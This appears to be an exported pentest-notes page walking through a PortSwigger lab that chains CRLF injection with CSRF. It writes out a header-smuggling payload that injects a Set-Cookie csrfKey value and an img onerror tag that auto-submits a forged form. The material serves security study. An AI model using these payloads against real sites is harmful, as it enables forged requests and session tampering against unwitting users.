<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>example</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>example</h1><br /> <br />Request:<br /><a href=""><img src="images/1719-1.png"
        alt="images/1719-1.png" /></a><br /><br />Response:<br /><a href=""><img src="images/1719-2.png"
        alt="images/1719-2.png" /></a><br />From the response we can see that the site is vulnerable
    <br /><br /><br /><br /><strong>Example of CRLF Injection with a site vulnerable also to CSRF (in particular to
    </strong><a
      href="test--Exploitation--Client-Side--Cross-Site_Request_Forgery_(CSRF-XSRF)--CSRF_vulnerabilities--CSRF_token_is_tied_to_a_non-session_cookie.html">CSRF
      token is tied to a non-session cookie</a><strong>)</strong><br />1. Select the request → “right click” and
    Engagement tools → Generate CSRF PoC <br /> <a href=""><img src="images/1719-3.png"
        alt="images/1719-3.png" /></a><br />2. Options → Include auto-submit script <br /> <a href=""><img
        src="images/1719-4.png" alt="images/1719-4.png" /></a><br />3. Regenerate<br />4. Instead of the
    &lt;script&gt;......... &lt;/script&gt; code<br /> <a href=""><img src="images/1719-5.png"
        alt="images/1719-5.png" /></a><br /> Insert a URL where inject the cookie:<br />
    <code>&lt;img src=&quot;</code><code><span style="color:#00ff00;">$cookie-injection-url</span></code><code>&quot; onerror=&quot;document.forms[0].submit()&quot;&gt;</code>
    <br /> and use the vulnerability to inject your csrfKey cookie into the victim&#39;s browser:<br />
    <code>/?search=</code><code><span style="color:#ff8700;">myTest</span></code><code>%0d%0aSet-Cookie:%20csrfKey=your-key</code>
    <br />5. The result in our scenario will be:<br />
    <code>&lt;img src=&quot;</code><code><span style="background-color:#00ff00;">https://ac9f1fe61e0ba4b8806b249200610069.web-security-academy.net/?search=</span></code><code><span style="color:#ff8700;background-color:#00ff00;">myTest</span></code><code><span style="background-color:#00ff00;">%0d%0aSet-Cookie:%20csrfKey=</span></code><code><span style="color:#ff8700;background-color:#00ff00;">29o0XARLGUeDu3FHff3q769ovhSBytvu</span></code><code>&quot; onerror=&quot;document.forms[0].submit()&quot;&gt;</code><br /><br /><a
      href=""><img src="images/1719-6.png" alt="images/1719-6.png" /></a><br /><br />Bibliography:<br /><a
      href="https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie" target="_blank">https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie</a><br /><a
      href="https://www.acunetix.com/websitesecurity/crlf-injection/" target="_blank">https://www.acunetix.com/websitesecurity/crlf-injection/</a>
  </div>
</body>

</html>